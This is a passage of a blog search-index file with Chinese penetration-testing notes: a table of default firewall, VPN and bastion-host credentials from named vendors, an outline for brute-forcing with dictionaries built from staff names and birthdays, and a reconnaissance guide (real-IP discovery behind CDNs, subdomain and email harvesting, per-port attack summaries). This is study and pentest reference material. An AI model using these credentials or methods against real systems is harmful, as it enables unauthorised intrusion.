href="https://10.1.5.254:8889/">https://10.1.5.254:8889</a></br><a href="https://10.50.10.45:8889/">https://10.50.10.45:8889</a></td><td>admin&#x2F;bane＠7766</br>admin&#x2F;admin＠123</td><td>10.50.10.44&#x2F;255.255.255.0</br>技术支持热线:4006243900</td></tr><tr><td>juniper</td><td><a href="https://192.168.1.1/">https://192.168.1.1</a></td><td>netscreen&#x2F;netscreen</td><td></td></tr><tr><td>Cisco</td><td><a href="https://192.168.0.1/">https://192.168.0.1</a></td><td>admin&#x2F;cisco</td><td></td></tr><tr><td>Huawei</td><td><a href="http://192.168.0.1/">http://192.168.0.1</a></td><td>admin&#x2F;Admin＠123</td><td></td></tr><tr><td>H3C</td><td><a href="http://192.168.0.1/">http://192.168.0.1</a></td><td>admin&#x2F;admin</td><td>4006306430</td></tr><tr><td>绿盟IPS</td><td><a href="https://192.168.1.101/">https://192.168.1.101</a></td><td>weboper&#x2F;weboper</td><td>配置重启生效</td></tr><tr><td>网神防火墙GE1口</td><td><a href="https://10.50.10.45/">https://10.50.10.45</a></td><td>admin&#x2F;firewall</td><td>4006108220</td></tr><tr><td>深信服VPN</td><td>51111端口</td><td>delanrecover</td><td></td></tr><tr><td>华为VPN</td><td></td><td>root&#x2F;mduadmin</td><td></td></tr><tr><td>华为防火墙</td><td></td><td>admin&#x2F;Admin＠123</br>eudemon&#x2F;eudemon</td><td></td></tr><tr><td>Juniper防火墙</td><td></td><td>netscreen&#x2F;netscreen</td><td></td></tr><tr><td>迪普</td><td>192.168.0.1</td><td>admin／admin＿default</td><td></td></tr><tr><td>山石</td><td>192.168.1.1</td><td>hillstone&#x2F;hillstone</td><td></td></tr><tr><td>安恒的明御防火墙</td><td></td><td>admin／adminadmin</td><td></td></tr><tr><td>某堡垒机</td><td></td><td>shterm／shterm</td><td></td></tr><tr><td>天融信的vpn</td><td></td><td>test／123456</td><td></td></tr></tbody></table><h1 id="2-实战思路"><a href="#2-实战思路" class="headerlink" title="2 实战思路"></a>2 实战思路</h1><ul><li>授权项目</li></ul><ol><li>ip地址</li><li>踩点获得人员姓名及生日</li></ol><h2 id="2-1-字典生成"><a href="#2-1-字典生成" class="headerlink" title="2.1 字典生成"></a>2.1 字典生成</h2><ul><li>人员姓名大小写加生日的弱口令</li><li>常规弱口令</li></ul><h2 id="2-2-批量爆破工具"><a href="#2-2-批量爆破工具" class="headerlink" title="2.2 批量爆破工具"></a>2.2 批量爆破工具</h2><ul><li>SNETCracker</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>PenTest</category>
      
      <category>经典漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>PenTest</tag>
      
      <tag>经典漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集</title>
    <link href="/2022/05/30/2022-05-30.%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2022/05/30/2022-05-30.%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#1-ip%E6%94%B6%E9%9B%86">1 IP收集</a><ul><li><a href="#11-%E5%88%A4%E6%96%AD%E7%9B%AE%E6%A0%87%E6%9C%89%E6%B2%A1%E6%9C%89%E4%BD%BF%E7%94%A8cdn">1.1 判断目标有没有使用CDN</a></li><li><a href="#12-%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9Eip">1.2 查找真实IP</a><ul><li><a href="#121-%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BD%91%E7%BB%9C%E6%90%9C%E7%B4%A2%E5%B9%B3%E5%8F%B0">1.2.1 大数据网络搜索平台</a></li><li><a href="#122-%E5%8E%86%E5%8F%B2dns%E8%AE%B0%E5%BD%95">1.2.2 历史DNS记录</a></li><li><a href="#123-%E4%B8%BB%E5%8A%A8%E8%BF%9E%E6%8E%A5%E6%9A%B4%E9%9C%B2%E7%9A%84%E7%9C%9F%E5%AE%9Eip">1.2.3 主动连接暴露的真实ip</a></li><li><a href="#124-%E5%9B%BD%E5%A4%96%E4%BB%A3%E7%90%86%E8%AE%BF%E9%97%AE">1.2.4 国外代理访问</a></li><li><a href="#125-%E7%BA%AF%E7%9C%9Fip%E6%95%B0%E6%8D%AE%E5%BA%93">1.2.5 纯真ip数据库</a></li></ul></li><li><a href="#13-ip%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">1.3 IP信息收集</a><ul><li><a href="#131-ip-%E6%AE%B5%E6%95%B4%E7%90%86">1.3.1 IP 段整理</a></li><li><a href="#132-c%E6%AE%B5%E6%97%81%E7%AB%99">1.3.2 C段、旁站</a></li></ul></li><li><a href="#14-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E">1.4 搜索引擎</a></li></ul></li><li><a href="#2-%E5%9F%9F%E5%90%8D%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86">2 域名、子域名收集</a><ul><li><a href="#21-%E5%9F%9F%E5%90%8D%E7%9A%84%E5%A4%87%E6%A1%88%E5%8F%B7">2.1 域名的备案号</a></li><li><a href="#22-%E5%AD%90%E5%9F%9F%E5%90%8D%E5%B7%A5%E5%85%B7">2.2 子域名工具</a></li><li><a href="#23-%E5%9C%A8%E7%BA%BF%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8E%A5%E5%8F%A3">2.3 在线子域名接口</a></li><li><a href="#24-%E5%85%B6%E4%BB%96%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF">2.4 其他泄露信息</a></li><li><a href="#25-ssl%E8%AF%81%E4%B9%A6%E6%9F%A5%E8%AF%A2">2.5 SSL证书查询</a></li></ul></li><li><a href="#3-app%E6%94%B6%E9%9B%86">3 APP收集</a><ul><li><a href="#31-app%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%92%8C%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC">3.1 app信息收集和历史版本</a></li><li><a href="#32-%E5%B7%A5%E5%85%B7">3.2 工具</a></li></ul></li><li><a href="#4-mail%E6%94%B6%E9%9B%86">4 MAIL收集</a></li><li><a href="#5-web%E6%94%B6%E9%9B%86">5 WEB收集</a></li><li><a href="#6-%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB">6 指纹识别</a><ul><li><a href="#61-%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BD%91%E7%AB%99">6.1 第三方网站</a></li><li><a href="#62-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6">6.2 浏览器插件</a></li><li><a href="#63-%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7">6.3 其他工具</a></li></ul></li><li><a href="#7-%E7%AB%AF%E5%8F%A3%E8%AF%86%E5%88%AB">7 端口识别</a><ul><li><a href="#71-%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3">7.1 常见端口</a></li><li><a href="#72-%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7">7.2 扫描工具</a></li></ul></li><li><a href="#8-%E5%8F%A3%E4%BB%A4%E6%94%B6%E9%9B%86">8 口令收集</a><ul><li><a href="#81-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AD%97%E5%85%B8%E7%9A%84%E7%94%9F%E6%88%90">8.1 弱口令字典的生成</a></li></ul></li></ul><h1 id="1-IP收集"><a href="#1-IP收集" class="headerlink" title="1 IP收集"></a>1 IP收集</h1><h2 id="1-1-判断目标有没有使用CDN"><a href="#1-1-判断目标有没有使用CDN" class="headerlink" title="1.1 判断目标有没有使用CDN"></a>1.1 判断目标有没有使用CDN</h2><p><a href="https://ping.chinaz.com/">全球ping</a></p><p>以 baidu.com 为例，全球ping结果显示如下，其中ip归属地皆为中国北京海淀 电信，但是ip地址不同，则可以确定为使用了CDN，如果结果显示ip归属地在不同地址，也可以确定为使用了CDN：</p><table><thead><tr><th>监测点</th><th>响应IP</th><th>IP归属地</th><th>响应时间</th><th>TTL</th><th>赞助商</th></tr></thead><tbody><tr><td>四川绵阳[电信]</td><td>220.181.38.251</td><td>中国北京海淀 电信</td><td>35ms</td><td>53ms</td><td></td></tr><tr><td>河南洛阳[多线]</td><td>220.181.38.148</td><td>中国北京海淀 电信</td><td>23ms</td><td>52ms</td><td></td></tr><tr><td>江苏镇江[多线]</td><td>220.181.38.251</td><td>中国北京海淀 电信</td><td>32ms</td><td>49ms</td><td></td></tr><tr><td>江苏镇江[电信]</td><td>220.181.38.148</td><td>中国北京海淀 电信</td><td>27ms</td><td>50ms</td><td></td></tr></tbody></table><h2 id="1-2-查找真实IP"><a href="#1-2-查找真实IP" class="headerlink" title="1.2 查找真实IP"></a>1.2 查找真实IP</h2><blockquote><p>Tips:找到真实ip，绑定host，可以打开目标网站就是真实ip</p></blockquote><h3 id="1-2-1-大数据网络搜索平台"><a href="#1-2-1-大数据网络搜索平台" class="headerlink" title="1.2.1 大数据网络搜索平台"></a>1.2.1 大数据网络搜索平台</h3><p><a href="https://zoomeye.org/">钟馗之眼</a></p><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E9%92%9F%E9%A6%97%E4%B9%8B%E7%9C%BC.png" alt="钟馗之眼"></p><p><a href="https://www.censys.io/">censys</a></p><p><a href="https://fofa.info/">FOFA</a></p><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/fofa.png" alt="FOFA"></p><p><a href="%5Bshodan%5D(https://www.shodan.io/)">shodan</a></p><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/shodan.png" alt="shoda"></p><h3 id="1-2-2-历史DNS记录"><a href="#1-2-2-历史DNS记录" class="headerlink" title="1.2.2 历史DNS记录"></a>1.2.2 历史DNS记录</h3><blockquote><p>最早解析的ip地址为真实ip地址，(可能会存在使用CDN前的ip地址)</p></blockquote><p><a href="https://dnsdb.io/zh-cn">全球DNS搜索引擎</a></p><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%85%A8%E7%90%83DNS%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E.png" alt="全球DNS搜索引擎"></p><p><a href="https://x.threatbook.cn/">情报社区</a></p><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BE%AE%E6%AD%A5%E5%9C%A8%E7%BA%BF.png" alt="情报社区"></p><p><a href="https://toolbar.netcraft.com/site_report?url=">Netcraft</a></p><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Netcraft.png" alt="Netcraft"></p><p><a href="http://viewdns.info/">viewdnsinfo</a></p><p><a href="https://github.com/3xp10it/xcdn">xcdn</a></p><p><a href="http://bobao.360.cn/learning/detail/221.html">zmap</a></p><h3 id="1-2-3-主动连接暴露的真实ip"><a href="#1-2-3-主动连接暴露的真实ip" class="headerlink" title="1.2.3 主动连接暴露的真实ip"></a>1.2.3 主动连接暴露的真实ip</h3><ul><li>注册网站邮件验证(显示邮件原文，from字段为真实ip)</li><li>RSS</li><li>订阅网站</li></ul><h3 id="1-2-4-国外代理访问"><a href="#1-2-4-国外代理访问" class="headerlink" title="1.2.4 国外代理访问"></a>1.2.4 国外代理访问</h3><p>国内的CDN往往只针对国内用户访问加速，有时候通过国外的DNS解析可以得到真实IP</p><h3 id="1-2-5-纯真ip数据库"><a href="#1-2-5-纯真ip数据库" class="headerlink" title="1.2.5 纯真ip数据库"></a>1.2.5 纯真ip数据库</h3><h2 id="1-3-IP信息收集"><a href="#1-3-IP信息收集" class="headerlink" title="1.3 IP信息收集"></a>1.3 IP信息收集</h2><h3 id="1-3-1-IP-段整理"><a href="#1-3-1-IP-段整理" class="headerlink" title="1.3.1 IP 段整理"></a>1.3.1 IP 段整理</h3><p><a href="https://ipwhois.cnnic.net.cn/">CNNICIP</a></p><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/ip%E6%AE%B5.png" alt="CNNICIP"></p><h3 id="1-3-2-C段、旁站"><a href="#1-3-2-C段、旁站" class="headerlink" title="1.3.2 C段、旁站"></a>1.3.2 C段、旁站</h3><p><a href="http://www.webscan.cc/">WebScan</a></p><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/WebScan.png" alt="WebScan"></p><p><a href="https://chapangzhan.com/">查旁站</a></p><h2 id="1-4-搜索引擎"><a href="#1-4-搜索引擎" class="headerlink" title="1.4 搜索引擎"></a>1.4 搜索引擎</h2><p><a href="https://scholar.google.com.ph/">google学术</a></p><h1 id="2-域名、子域名收集"><a href="#2-域名、子域名收集" class="headerlink" title="2 域名、子域名收集"></a>2 域名、子域名收集</h1><h2 id="2-1-域名的备案号"><a href="#2-1-域名的备案号" class="headerlink" title="2.1 域名的备案号"></a>2.1 域名的备案号</h2><p><a href="icp.chinaz.com">chinaz</a></p><h2 id="2-2-子域名工具"><a href="#2-2-子域名工具" class="headerlink" title="2.2 子域名工具"></a>2.2 子域名工具</h2><ul><li>子域名挖掘机Layer</li><li>Sublist3r</li><li>oneforall</li></ul><h2 id="2-3-在线子域名接口"><a href="#2-3-在线子域名接口" class="headerlink" title="2.3 在线子域名接口"></a>2.3 在线子域名接口</h2><ol><li><a href="https://securitytrails.com/list/apex_domain">https://securitytrails.com/list/apex_domain</a></li><li><a href="http://ce.baidu.com/index/getRelatedSites">http://ce.baidu.com/index/getRelatedSites</a></li><li><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></li><li><a href="https://findsubdomains.com/">https://findsubdomains.com/</a></li><li><a href="https://dnslytics.com/domain">https://dnslytics.com/domain</a></li></ol><h2 id="2-4-其他泄露信息"><a href="#2-4-其他泄露信息" class="headerlink" title="2.4 其他泄露信息"></a>2.4 其他泄露信息</h2><ol><li>crossdomain.xml文件</li><li>爬虫递归爬取</li><li>DNS域传送漏洞</li></ol><h2 id="2-5-SSL证书查询"><a href="#2-5-SSL证书查询" class="headerlink" title="2.5 SSL证书查询"></a>2.5 SSL证书查询</h2><ol><li>不安全的站点，浏览器证书信息泄露</li><li>dnsdumpster.com</li></ol><h1 id="3-APP收集"><a href="#3-APP收集" class="headerlink" title="3 APP收集"></a>3 APP收集</h1><h2 id="3-1-app信息收集和历史版本"><a href="#3-1-app信息收集和历史版本" class="headerlink" title="3.1 app信息收集和历史版本"></a>3.1 app信息收集和历史版本</h2><ul><li>ios：同公司的其他产品</li><li>android：酷安、碗豆荚等</li></ul><h2 id="3-2-工具"><a href="#3-2-工具" class="headerlink" title="3.2 工具"></a>3.2 工具</h2><blockquote><p>未加密的app会扫描出大量可注入链接</p></blockquote><ul><li>appinfoscanner</li></ul><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/appinfoscanner.png" alt="appinfoscanner"></p><h1 id="4-MAIL收集"><a href="#4-MAIL收集" class="headerlink" title="4 MAIL收集"></a>4 MAIL收集</h1><p><a href="https://hunter.io/">email猎人在线</a></p><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%8C%8E%E4%BA%BA%E5%9C%A8%E7%BA%BF.png" alt="email猎人在线"></p><p><a href="https://email-format.com/i/search_result/?q=">email-format</a></p><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/email-format.png" alt="email-format"></p><h1 id="5-WEB收集"><a href="#5-WEB收集" class="headerlink" title="5 WEB收集"></a>5 WEB收集</h1><p><a href="https://github.com/ElevenPaths/FOCA">FOCA</a></p><h1 id="6-指纹识别"><a href="#6-指纹识别" class="headerlink" title="6 指纹识别"></a>6 指纹识别</h1><h2 id="6-1-第三方网站"><a href="#6-1-第三方网站" class="headerlink" title="6.1 第三方网站"></a>6.1 第三方网站</h2><p><a href="www.yunsee.cn">云悉</a></p><h2 id="6-2-浏览器插件"><a href="#6-2-浏览器插件" class="headerlink" title="6.2 浏览器插件"></a>6.2 浏览器插件</h2><ul><li>wappalyzer</li></ul><h2 id="6-3-其他工具"><a href="#6-3-其他工具" class="headerlink" title="6.3 其他工具"></a>6.3 其他工具</h2><ul><li>what-web</li><li>finger</li></ul><h1 id="7-端口识别"><a href="#7-端口识别" class="headerlink" title="7 端口识别"></a>7 端口识别</h1><h2 id="7-1-常见端口"><a href="#7-1-常见端口" class="headerlink" title="7.1 常见端口"></a>7.1 常见端口</h2><table><thead><tr><th>端口</th><th>服务</th><th>总结</th><th>文档</th></tr></thead><tbody><tr><td>21</td><td>FTP&#x2F;TFTP&#x2F;VSFTPD</td><td>爆破&#x2F;嗅探&#x2F;溢出&#x2F;后门</td><td></td></tr><tr><td>22</td><td>SSH远程连接</td><td>爆破&#x2F;openssh漏洞</td><td></td></tr><tr><td>23</td><td>TELNET远程连接</td><td>爆破&#x2F;嗅探&#x2F;弱口令</td><td></td></tr><tr><td>25</td><td>SMTP邮件服务</td><td>邮件伪造</td><td></td></tr><tr><td>53</td><td>DNS域名解析系统</td><td>域传送&#x2F;劫持&#x2F;缓存投毒&#x2F;欺骗</td><td></td></tr><tr><td>67&#x2F;68</td><td>dhcp服务</td><td>劫持&#x2F;欺骗</td><td></td></tr><tr><td>110</td><td>pop3</td><td>爆破&#x2F;嗅探</td><td></td></tr><tr><td>139</td><td>samba服务</td><td>爆破&#x2F;未授权访问&#x2F;远程命令执行</td><td></td></tr><tr><td>143</td><td>Imap协议</td><td>爆破JGSNMP协议爆破&#x2F;搜集目标内网信息</td><td></td></tr><tr><td>389</td><td>Ldap目录访问协议</td><td>注入&#x2F;未授权访问&#x2F;弱口令</td><td></td></tr><tr><td>445</td><td>smb</td><td>ms17-010端口溢出</td><td></td></tr><tr><td>512&#x2F;513&#x2F;514</td><td>Linux Rexec服务</td><td>爆破&#x2F;Rlogin登陆</td><td></td></tr><tr><td>873</td><td>Rsyxc服务</td><td>文件上传&#x2F;未授权访问</td><td></td></tr><tr><td>1080</td><td>socket</td><td>爆破</td><td></td></tr><tr><td>1352</td><td>Lotus domino邮件服务</td><td>爆破&#x2F;信息泄漏</td><td></td></tr><tr><td>1433</td><td>mssql</td><td>爆破&#x2F;注入&#x2F;SA弱口令</td><td></td></tr><tr><td>1521</td><td>oracle</td><td>爆破&#x2F;注入&#x2F;TNS爆破&#x2F;反弹shell2O49NfS服务配置不当</td><td></td></tr><tr><td>2181</td><td>zookeeper服务</td><td>未授权访问</td><td></td></tr><tr><td>2375</td><td>docker remote api</td><td>未授权访问</td><td></td></tr><tr><td>3306</td><td>mysql</td><td>爆破&#x2F;注入</td><td></td></tr><tr><td>3389</td><td>Rdp远程桌面链接</td><td>爆破&#x2F;shfit后门</td><td></td></tr><tr><td>4848</td><td>GassFish控制台</td><td>爆破&#x2F;认证绕过</td><td></td></tr><tr><td>5000</td><td>sybase&#x2F;DB2数据库</td><td>爆破&#x2F;注入&#x2F;提权</td><td></td></tr><tr><td>5432</td><td>postgresql</td><td>爆破&#x2F;注入&#x2F;缓冲区溢出</td><td></td></tr><tr><td>5632</td><td>pcanywhere服务</td><td>抓密码&#x2F;代码执行</td><td></td></tr><tr><td>5900</td><td>vnc</td><td>爆破&#x2F;认证绕过</td><td></td></tr><tr><td>6379</td><td>Redis数据库</td><td>未授权访问&#x2F;爆破</td><td></td></tr><tr><td>7001&#x2F;7002</td><td>weblogic</td><td>反序列化&#x2F;控制台弱口令</td><td></td></tr><tr><td>80&#x2F;443</td><td>http&#x2F;https</td><td>web应用漏洞&#x2F;心脏滴血</td><td></td></tr><tr><td>8069</td><td>zabbix服务</td><td>远程命令执行&#x2F;注入</td><td></td></tr><tr><td>8161</td><td>activemq</td><td>弱口令&#x2F;写文件</td><td></td></tr><tr><td>8080&#x2F;8089</td><td>Jboss&#x2F;Tomcat&#x2F;Resin</td><td>爆破&#x2F;PUT文件上传&#x2F;反序列化</td><td></td></tr><tr><td>8083&#x2F;8086</td><td>influxDB</td><td>未授权访问</td><td></td></tr><tr><td>9000</td><td>fastcgi</td><td>远程命令执行</td><td></td></tr><tr><td>9090</td><td>Websphere</td><td>控制台爆破&#x2F;java反序列化&#x2F;弱口令</td><td></td></tr><tr><td>9200&#x2F;9300</td><td>elasticsearch</td><td>远程代码执行</td><td></td></tr><tr><td>11211</td><td>memcached</td><td>未授权访问</td><td></td></tr><tr><td>27017&#x2F;27018</td><td>mongodb</td><td>未授权访问&#x2F;爆破</td><td></td></tr></tbody></table><h2 id="7-2-扫描工具"><a href="#7-2-扫描工具" class="headerlink" title="7.2 扫描工具"></a>7.2 扫描工具</h2><ul><li>scanport</li><li>nmap</li><li>masscan</li><li>masnmapscan</li><li>zmap</li><li>御剑高速TCP端口扫描工具</li><li>御剑高速端口扫描工具</li><li>IISPutScanner</li><li>IISPutScanner增强版-DotNetScan</li></ul><h1 id="8-口令收集"><a href="#8-口令收集" class="headerlink" title="8 口令收集"></a>8 口令收集</h1><h2 id="8-1-弱口令字典的生成"><a href="#8-1-弱口令字典的生成" class="headerlink" title="8.1 弱口令字典的生成"></a>8.1 弱口令字典的生成</h2><ul><li>针对个人信息生成针对个人的密码字典</li></ul><p><a href="https://www.bugku.com/mima/">CTF密码生成器</a></p><ul><li>白鹿社工字典生成器</li></ul><p><a href="https://github.com/x311/BaiLu-SED-Tool">白鹿社工字典生成器</a></p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>PenTest</category>
      
      <category>信息收集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>PenTest</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
